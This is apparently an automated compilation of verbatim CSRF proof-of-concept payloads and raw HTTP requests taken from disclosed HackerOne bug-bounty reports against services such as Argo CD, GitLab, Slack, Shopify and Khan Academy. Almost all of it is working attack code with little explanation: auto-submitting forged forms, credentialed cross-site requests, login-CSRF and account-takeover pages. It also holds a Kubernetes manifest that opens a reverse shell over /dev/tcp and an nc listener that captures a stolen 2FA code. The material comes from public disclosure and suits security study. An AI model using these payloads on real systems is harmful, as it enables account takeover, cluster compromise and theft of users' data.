# CSRF — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #2326194 Argo CD CSRF leads to Kubernetes cluster compromise — ibb — $4,660 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2024/2326194.md` (https://hackerone.com/reports/2326194)

```
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications');
xhr.setRequestHeader('Content-Type', 'text/plain')
xhr.withCredentials = true;
xhr.send('{"apiVersion":"argoproj.io/v1alpha1","kind":"Application","metadata":{"name":"test-app1"},"spec":{"destination":{"name":"","namespace":"default","server":"https://kubernetes.default.svc"},"source":{"path":"argotest1","repoURL":"https://github.com/califio/argotest1","targetRevision":"HEAD"},"sources":[],"project":"default","syncPolicy":{"automated":{"prune":false,"selfHeal":false}}}}')
```

```
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-sa
---
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  serviceAccountName: my-sa
  containers:
  - name: ubuntu
    image: ubuntu:latest
    command: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: my-role
rules:
- apiGroups: [""]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: my-rolebinding
subjects:
- kind: ServiceAccount
  name: my-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: my-role
  apiGroup: rbac.authorization.k8s.io
```

```
    image: ubuntu:latest
    command: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"]
```

## #1122408 CSRF on /api/graphql allows executing mutations through GET requests — gitlab — $3,370 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2021/1122408.md` (https://hackerone.com/reports/1122408)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>


    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```

```
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
```

```
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>
```

## #805073 Periscope iOS app CSRF in follow action due to deeplink — x — $2,940 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2020/805073.md` (https://hackerone.com/reports/805073)

```
<!DOCTYPE html>
<html>
<a href="pscp://user/<any user-id>/follow">CSRF DEMO</a>
</html>
```

## #170552 Slack integration setup lacks CSRF protection — security — $2,500 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2021/170552.md` (https://hackerone.com/reports/170552)

```
GET https://hackerone.com/auth/slack HTTP/1.1
```

```
Location: https://slack.com/oauth/authorize
?client_id=2174110321.11522100978
&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback
&response_type=code
&scope=incoming-webhook
&state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c
```

```
GET https://hackerone.com/auth/slack?CSRF_TOKEN=bdea53bd9a8c73bd983847 HTTP/1.1
```

## #1923672 Account takeover due to insufficient URL validation on RelayState parameter — gitlab — $2,450 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2023/1923672.md` (https://hackerone.com/reports/1923672)

```
GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2
Host: api.bitbucket.org
User-Agent: curl/7.79.1
Accept: */*
Authorization: Bearer Txpo3AXXQZHlp....
```

```
<html>
<title>GitLab</title>


<body>
	
<span>Logout of gitlab if logged in:</span>

<form action="https://gitlab.com/users/sign_out" target="_blank" method="post"><button>Logout Gitlab Account</button></form>

<br>
<br>
<br>
<br>

<span>Open redirect via SAML:</span>

<form action="https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml" target="_blank" method="get">
	<input type="hidden" name="RelayState" value=".witcoat.com" /> 
	<button>Save Open Redirect</button></form>
<br>


<span>steal oauth access Token For Bitbucket:</span>

<form action="https://bitbucket.org/site/oauth2/authorize" target="_blank" method="get">
	<input type="hidden" name="client_id" value="b9jLmh8WCLZPBAwWba" /> 
  <input type="hidden" name="redirect_uri" value="https://gitlab.com/users/auth/bitbucket/callback" /> 
  <input type="hidden" name="response_type" value="token" /> 
    <input type="hidden" name="state" value="Doesnotmatter" /> 


	<button>Steal Bitbucket Code</button>
</form>


</body>



</html>
```

```
GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2
Host: api.bitbucket.org
User-Agent: curl/7.79.1
Accept: */*
Authorization: Bearer Txpo3AXXQZHlp....

'''
```

## #47472 CSP Bypass: Click handler for links with data-method="post" can cause authenticity_token to be sent off domain — security — $2,000 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2015/47472.md` (https://hackerone.com/reports/47472)

```
<a href="http://danlec.com" data-method="post">Proof of Concept</a>
```

```
$(".hacktivity-container-content:first")
 .html('<p><a href="http://danlec.com" data-method="post">Click Me!</a></p>')
```

```
<form method="POST" action="https://hackerone.com/danlec-test/team_members"
     target="_blank">
  <input type="text" name="authenticity_token" 
     value="authenticity_token from the POST to this page">
  <input type="text" name="invitations_team_member[email]" 
     value="attacker@gmail.com">
  <input type="hidden" name="team_member[add_as_manager]" value="1">
  <input type="hidden" name="utf8" value="✓">
  <input type="hidden" name="commit" value="Send invite">
  <input type="submit">
</form>
```

## #994504 authenticity token not verfied leads to change business name — shopify — $1,900 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2020/994504.md` (https://hackerone.com/reports/994504)

```
POST /signup HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://partners.shopify.com/signup
Content-Type: application/x-www-form-urlencoded
Content-Length: 690
Connection: close
Cookie: █████
Upgrade-Insecure-Requests: 1

authenticity_token=2vAI2NSYAWswz76VP5oZOX9qsoS%2BriQxAkUstj53i1xLI59byffVldnssNEjtHqZKcM%2BQ1VRq5kheL5Vibf%2FTw%3D%3D&organization%5Bbusiness_name%5D=df&organization%5Bbusiness_email%5D=cforu%2B6%40wearehackerone.com&organization%5Bwebsite%5D=&address%5Baddress1%5D=fake&address%5Baddress2%5D=&address%5Bcity%5D=cairo&address%5Bcountry_code%5D=EG&address%5Bprovince_code%5D=C&address%5Bpostal_code%5D=123&signup_profile_form%5Bprimary_revenue_intent%5D=other&signup_profile_form%5Bcustom_primary_revenue_intent%5D=bug+bounty&signup_profile_form%5Bcustom_other_platforms%5D=&signup_profile_form%5Bother_platforms%5D%5B%5D=no_platform&partner_agreement_accepted=0&partner_agreement_accepted=1
```

```
I have attached a video to make it easy for you

As a summary
The problem is that the 
```

## #583987 Periscope android app deeplink leads to CSRF in follow action — x — $1,540 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2020/583987.md` (https://hackerone.com/reports/583987)

```
<data android:host="user" android:pathPrefix="/" android:scheme="pscp"/>
<data android:host="user" android:pathPrefix="/" android:scheme="pscpd"/>
<data android:host="broadcast" android:pathPrefix="/" android:scheme="pscp"/>
<data android:host="broadcast" android:pathPrefix="/" android:scheme="pscpd"/>
<data android:host="channel" android:pathPrefix="/" android:scheme="pscp"/>
<data android:host="channel" android:pathPrefix="/" android:scheme="pscpd"/>
<data android:host="discover" android:pathPrefix="/" android:scheme="pscp"/>
<data android:host="discover" android:pathPrefix="/" android:scheme="pscpd"/>
```

```
<!DOCTYPE html>
<html>
<a href="pscp://user/<any user-id>/follow">CSRF DEMO</a>
</html>
```

## #1353103 Drive-by arbitrary file deletion in the GDK via letter_opener_web gem — gitlab — $750 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2021/1353103.md` (https://hackerone.com/reports/1353103)

```
mount LetterOpenerWeb::Engine, at: '/rails/letter_opener'
```

```
    def destroy
      @letter.delete
      redirect_to routes.letters_path
    end

    private
   def load_letter
      @letter = Letter.find(params[:id])
      head :not_found unless @letter.exists?
    end
```

```
    def self.find(id)
      new(id: id)
    end

    def initialize(params)
      @id      = params.fetch(:id)
      @sent_at = params[:sent_at]
    end

    def delete
      FileUtils.rm_rf("#{LetterOpenerWeb.config.letters_location}/#{id}")
    end
```

## #100849 URGENT : NICHE.co Account Take Over Vulnerability — x — $560 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2015/100849.md` (https://hackerone.com/reports/100849)

```
    <html>
    <head>
    <title>CSRF Attack Page: /get-started/complete</title>
    </head>
```

```
    <form method="POST" action="https://www.niche.co/get-started/complete">
    <input type="hidden" name="utf8" value="âœ“"/>
    <input type="hidden" name="_method" value="patch"/>
    <input type="hidden" name="authenticity_token" value=""/>
    <input type="hidden" name="commit" value="Get Started"/>
    <input type="hidden" name="user[name]" value="Hacked"/>
    <input type="hidden" name="user[email]" value="hacker1@gmail.com"/>
    <input type="hidden" name="user[username]" value="hacked123"/>
    <input type="hidden" name="user[phone_number]" value=""/>
    <input type="hidden" name="user[location_id]" value="79790"/>
    <input type="hidden" name="user[gender]" value=""/>
    <input type="submit" value="submit">s
    </form>
```

## #834366 Login CSRF vulnerability on hackerone.com — security — $500 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2020/834366.md` (https://hackerone.com/reports/834366)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://hackerone.com/users/sign_in" method="POST">
      <input type="hidden" name="user[email]" value="youremail" />
      <input type="hidden" name="user[password]" value="yourpassword" />
      <input type="hidden" name="user[remember_me]" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

```
    <form action="https://hackerone.com/users/sign_in" method="POST">
      <input type="hidden" name="user[email]" value="youremail" />
      <input type="hidden" name="user[password]" value="yourpassword" />
      <input type="hidden" name="user[remember_me]" value="1" />
      <input type="submit" value="Submit request" />
    </form>
```

## #534908 CSRF at https://chatstory.pixiv.net/imported — pixiv — $500 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2020/534908.md` (https://hackerone.com/reports/534908)

```
    <form action="https://chatstory.pixiv.net/imported" method="POST">
      <input type="hidden" name="id" value="10997105" />
      <input type="hidden" name="text" value="test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;&#13;&#10;&#13;&#10;&#13;&#10;Title&#13;&#10;&#13;&#10;Normal&#13;&#10;&#13;&#10;Jump&#13;&#10;&#13;&#10;&#13;&#10;" />
      <input type="hidden" name="comment" value="test&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;" />
      <input type="hidden" name="tags" value="&#35;test" />
      <input type="hidden" name="title" value="test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="user&#95;id" value="39570048" />
      <input type="hidden" name="x&#95;restrict" value="0" />
      <input type="hidden" name="is&#95;original" value="true" />
      <input type="submit" value="Submit request" />
    </form>
```

## #593893 CSRF in generating developer api_key — magic-bbp — $500 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2019/593893.md` (https://hackerone.com/reports/593893)

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://api.fortmatic.com/v1/dashboard/api_user/keys/regenerate" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&#125;" value="" />
      <input type="submit" value="Generate New Keys" />
    </form>
  </body>
</html>
```

```
    <form action="https://api.fortmatic.com/v1/dashboard/api_user/keys/regenerate" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&#125;" value="" />
      <input type="submit" value="Generate New Keys" />
    </form>
```

## #99708 Limited CSRF bypass. — security — $500 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2015/99708.md` (https://hackerone.com/reports/99708)

```
GET /99698?.json HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: hnDDTUm26xeV9lKMm8pnjsNsXKpMEtitUNMa2PeEFlUNiHLoO2J0lOxJpIYxmnXnbF1hNQMwUdB3e9MErdDktQ==
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com
```

```
GET //auth/slack/callback?code.json HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: BNkBdXZy5Yi14v1pV0PMwOXB8xfg+HuiBFE36dPJNraPIbDQBKZ6C8xdC2P9E96pSvDOiK/a8t8j+f41iZ3EVg==
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com
```

```
HTTP/1.1 302 Found
Server: cloudflare-nginx
Date: Sat, 14 Nov 2015 19:20:09 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 9
Connection: keep-alive
Cache-Control: no-cache
Cf-Railgun: c8927a839b stream 0.000000 0231 5f99
Content-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f
Location: /auth/failure?message=csrf_detected&origin=https%3A%2F%2Fhackerone.com&strategy=slack
```

## #155774 CSRF - Add optional two factor mobile number — slack — $500 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2016/155774.md` (https://hackerone.com/reports/155774)

```
POST /account/settings/2fa_sms HTTP/1.1
Host: cs-sa.slack.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: REDACTED=REDACTED
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

verify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0████████&country_code=AU&phone_number=█████████
```

```
<html>
<body>
<IFRAME style="display:none" name="hidden-form"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form" name="pocframe">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" name="phone&#95;number" value="█████████" />
    </form>
<script>document.pocframe.submit();</script>

<script src="http://192.168.1.82:8080/a"></script>
<IFRAME style="display:none" name="hidden-form2"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form2" name="pocframe2">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="1" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="formatted&#95;phone&#95;number" value="&#43;61&#32;████████" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" id="scode" name="confirmation&#95;code" value="" />
    </form>
<script>
	document.getElementById("scode").value = scode;
	document.pocframe2.submit();
</script>
</body>
</html>
```

```
root@foxtrotter:/var/www/html# nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194
GET /a HTTP/1.1
Host: 192.168.1.82:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.82/slackcsrf.html
Connection: close
Cache-Control: max-age=0

HTTP/1.1 200 OK

scode=196206;
```

## #55911 CSRF token fixation in facebook store app that can lead to adding attacker to victim acc  — shopify — $500 — Violation of Secure Design Principles
Source: `hackerone/reports/2015/55911.md` (https://hackerone.com/reports/55911)

```
<html>
<body>
<a href=https://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token ]&state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_>
</body>
</html>
```

## #114430 CSRF on https://shopify.com/plus — shopify — $500 — Information Disclosure
Source: `hackerone/reports/2016/114430.md` (https://hackerone.com/reports/114430)

```
POST https://example.com/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.shopify.com/plus?insp_pingurln=https://example.com/%23
Content-Length: 1058
Origin: https://www.shopify.com
Connection: keep-alive
Host: example.com
```

```
w=443176196&uid=1582993167&sid=1116922839&nv=true&u=https%3A%2F%2Fwww.shopify.com%2Fplus%3Finsp_pingurln%3Dhttps%3A%2F%2Fexample.com%2F%2523&or=https%3A%2F%2Fwww.shopify.com&ref=d&title=Enterprise+Ecommerce+Software+-+Scalable+Ecommerce+Platform&pw=1266&ph=629&pad=6&ism=false&dbglvl=3&dbgpad=5&dbgtpad=string&dbggcil=.shopify.com&cloc=undefined&st=4402&dbgk=&jv=4&identity=&targcv%5Blochref%5D=https%3A%2F%2Fwww.shopify.com%2Fplus%3Finsp_pingurln%3Dhttps%3A%2F%2Fexample.com%2F%2523&targcv%5Bdoctitle%5D=Enterprise+Ecommerce+Software+-+Scalable+Ecommerce+Platform&targcv%5Blptitle%5D=Enterprise+Ecommerce+Software+-+Scalable+Ecommerce+Platform&targcv%5Blpurl%5D=https%3A%2F%2Fwww.shopify.com%2Fplus&targcv%5B%24browser%5D%5Bmozilla%5D=true&targcv%5B%24browser%5D%5Bversion%5D=44.0&targcv%5BuserAgent%5D=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A44.0)+Gecko%2F20100101+Firefox%2F44.0&targcv%5Bmobchua%5D=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A44.0)+Gecko%2F20100101+Firefox%2F44.0&targcv%5Bref%5D=d&targcv%5Bnv%5D=true&isvp=false
```

## #1121990 CSRF leads to account deactivation of users — evernote — $300 — None
Source: `hackerone/reports/2021/1121990.md` (https://hackerone.com/reports/1121990)

```
    <form action="https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true" method="POST">
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="oneTimeCode" value="" />
      <input type="hidden" name="captchaResponse" value="" />
      <input type="hidden" name="reasons&#91;analytic&#93;" value="specify&#45;reason&#45;different&#45;app" />
      <input type="hidden" name="reasons&#91;i18nKey&#93;" value="CloseAccountAction&#46;accountActionSurvey&#46;differentApp" />
      <input type="hidden" name="reasons&#91;checked&#93;" value="true" />
      <input type="hidden" name="otherReason" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

## #975983 Site-wide CSRF on Safari due to CORS misconfiguration (not localhost) — cs_money — $300 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2020/975983.md` (https://hackerone.com/reports/975983)

```
var FormEl = `
<form action="https://new.cs.money/change_email" method="POST">
        <input type="hidden" name="email" value="nnez+attacker@wearehackerone.com" />
        <button type="submit" style="font-size:28pt;z-index:99999">Submit</button>
    </form>
`;
var Div = document.createElement('div');
Div.innerHTML = FormEl;
document.body.appendChild(Div);
```

```
        <input type="hidden" name="email" value="nnez+attacker@wearehackerone.com" />
        <button type="submit" style="font-size:28pt;z-index:99999">Submit</button>
    </form>
```

## #774 Log in a user to another account — phabricator — $300 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2014/774.md` (https://hackerone.com/reports/774)

```
    <form action="http://DOMAIN-WITH-PHABRICATOR/auth/login/password:self/" method="POST">
      <input type="hidden" name="&#95;&#95;dialog&#95;&#95;" value="1" />
      <input type="hidden" name="username" value="user3" />
      <input type="hidden" name="password" value="password3" />
      <input type="submit" value="Submit request" />
    </form>
```

## #577920 login csrf in analytics.mopub.com — x — $280 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2019/577920.md` (https://hackerone.com/reports/577920)

```
POST /login HTTP/1.1
Host: analytics.mopub.com
Connection: close
Content-Length: 37
Accept: application/json, text/plain, */*
Origin: https://analytics.mopub.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
Content-Type: application/json;charset=UTF-8
Referer: https://analytics.mopub.com/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _ga=██████; _gid=███████; mp_mixpanel__c=0

>{"name":"username","pass":"password"}
```

## #1085336 CSRF when unlocking lenses leads to lenses being forcefully installed without user interaction — snapchat — $250 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2021/1085336.md` (https://hackerone.com/reports/1085336)

```
https://www.snapchat.com/unlock/?type=SNAPCODE&uuid=6ff5a565fca249a1948b1963ee2881b4&metadata=01
```

```
https://www.snapchat.com/unlock/?type=SNAPCODE_NO_PROMPT&uuid=6ff5a565fca249a1948b1963ee2881b4&metadata=01
```

```
snapchat://unlock/?type=SNAPCODE_NO_PROMPT&uuid=6ff5a565fca249a1948b1963ee2881b4&metadata=01
```

## #727 Switching the user to the attacker's account — security — $150 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2014/727.md` (https://hackerone.com/reports/727)

```
    <form action="https://hackerone.com/users/sign_out" method="POST">
      <input type="hidden" name="&#95;method" value="delete" />
      <input type="submit" value="Submit request" />
    </form>
```

```
    <form action="https://hackerone.com/users/password" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="put" />
      <input type="hidden" name="user&#91;reset&#95;password&#95;token&#93;" value="ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL" />
      <input type="hidden" name="user&#91;password&#93;" value="ENTER_HERE_NEW_PASSWORD" />
      <input type="hidden" name="user&#91;password&#95;confirmation&#93;" value="ENTER_HERE_NEW_PASSWORD" />
      <input type="hidden" name="commit" value="Change&#32;password" />
      <input type="submit" value="Submit request" />
    </form>
```

## #205953 CSRF - Adding unlimited number of saved items via GET request — lyst — $150 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2017/205953.md` (https://hackerone.com/reports/205953)

```
GET /email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/ HTTP/1.1
Host: www.lyst.com
```

```
GET /email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/ HTTP/1.1
Host: www.lyst.com
'''

By adding a stock alert notification to an item, the respective item is automatically added in the saved list and because this is a GET request, there is no CSRF token/protection here.
```

## #1466765 monitoring.prow-canary.k8s.io is vulnerable to CVE-2022-21703 (Grafana 0-day) — kubernetes — $100 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2024/1466765.md` (https://hackerone.com/reports/1466765)

```
const baseUrl = "https://monitoring.prow-canary.k8s.io";
const url = `${baseUrl}/api/org/invites`;
const name = "attacker";
const email = "attacker@example.com";
const data = {"name":name,"email":"","role":"Admin","sendEmail":false,"loginOrEmail":email};
const opts = {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  headers: {
    "Content-Type": "text/plain; json"
  },
  body: JSON.stringify(data)
};
fetch(url, opts);
```

## #6872 Sign up CSRF — irccloud — $100 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2014/6872.md` (https://hackerone.com/reports/6872)

```
                <p>Sign up for a free account / <b><a href="/pricing" target="_blank">Pricing</a></b></p>
                <div class="userError"></div>
                <div id="signupOrgInfo" class="userInfo">You’re signing up to join the <b id="signupOrgName"></b> team.</div>
                <p class="form"><input class="input" name="realname" placeholder="Name"></p>
                <p class="form"><input class="input" name="email" type="email" placeholder="Email"></p>
                <p class="form"><input class="input" name="password" type="password" placeholder="Password"></p>
                <input type="hidden" name="invite">
                <input type="hidden" name="org_invite">
                <p class="form"><button type="submit" class="signup"><span>Sign up</span></button></p>
                <p><small>By signing up, you agree to our <a href="/terms">Terms of Service</a></small></p>
            </form>
```

## #6871 Login CSRF — irccloud — $100 — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2014/6871.md` (https://hackerone.com/reports/6871)

```
                    <p class="form">
                        <input class="input" name="email" type="email" placeholder="Email">
                        <input class="input" name="password" type="password" placeholder="Password">
                        <input type="hidden" name="org_invite">
                        <button type="submit"><span>Login</span></button>
                        <a class="forgotten" href="#?/password-reset">Forgotten your password?</a>
                    </p>
                    <div class="userError"></div>
                </form>
```

## #1727221 Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone — security — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2023/1727221.md` (https://hackerone.com/reports/1727221)

```
1. The flow starts with a POST request to
```

```
 {F1976252}

The response contains two tokens: ***session*** and ***csrf***. 

2. The frontend takes those values and uses them to send a request to the oauth2 endpoint to generate the authorization link.
```

```
 {F1976253}

3. Following the redirection takes us to the authorization page of the service provider

 {F1976255}

If we choose to Authorize Hackerone, we will get redirected to the token callback endpoint:
```

## #629892 Lack of CSRF header validation at https://g-mail.grammarly.com/profile — superhuman — - — Information Disclosure
Source: `hackerone/reports/2019/629892.md` (https://hackerone.com/reports/629892)

```
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
       document.getElementById("response-node").innerHTML = this.responseText;
   }
};
xhttp.open("GET", "https://g-mail.grammarly.com/profile", true);
xhttp.withCredentials = true;
xhttp.send();
```

```
{"id":749327815,"email":"email@yandex.ru","preferenceFields":[{"name":"Weekly Progress Reports","description":"Get a weekly report with statistics and insights on how you are writing with Grammarly.","order":49,"value":true},{"name":"Product Updates","description":"Important info on new features and products. We may also ask for your feedback on occasion.","order":50,"value":true},{"name":"Grammarly Offers","description":"These emails may include special upgrade offers, limited-time events, or coupons. ","order":50,"value":true},{"name":"The Grammarly Blog","description":"A weekly newsletter that includes fun tips on all things writing.","order":50,"value":true},{"name":"Grammarly Business","description":"Updates and information on our products for multi-person teams.","order":55,"value":true}],"unsubscribe":false}
```

```
var xhttp = new XMLHttpRequest();
var data = new FormData();
data.append("email", "████████");
data.append("unsubscribe", "false");
(...)
xhttp.open("POST", "https://g-mail.grammarly.com/profile", true);
xhttp.withCredentials = true;
xhttp.send(data);
```

## #419891 Cross-Site Request Forgery (CSRF) vulnerability on API endpoint allows account takeovers — khanacademy — - — Cross-Site Request Forgery (CSRF)
Source: `hackerone/reports/2019/419891.md` (https://hackerone.com/reports/419891)

```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>Khan Academy Signup Email CSRF PoC</title>
        <style type="text/css">
        body {
            display:flex;
            flex-direction:column;
            justify-content:center;
            min-height:100vh;
            margin:0;
        }
        p {
            display:flex;
            align-self:center;
            font-size:0.8rem;
            font-family:sans-serif;
            font-weight:bold;
            text-transform:uppercase;
            letter-spacing:0.1rem;
        }
        </style>
    </head>
    <body>
        <p>Khan Academy Signup Email CSRF PoC</p>
        <script type="text/javascript">
            window.addEventListener('load', function(e) {
                var attacker_addr = 'attacker@rapidlight.io';
                var x = new XMLHttpRequest();
                x.open('POST', 'https://www.khanacademy.org/signup/email', true);
                x.withCredentials = true;
                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                x.send('email=' + encodeURIComponent(attacker_addr));
            }, false);
        </script>
    </body>
</html>
```

```
    <head>
        <meta charset="utf-8" />
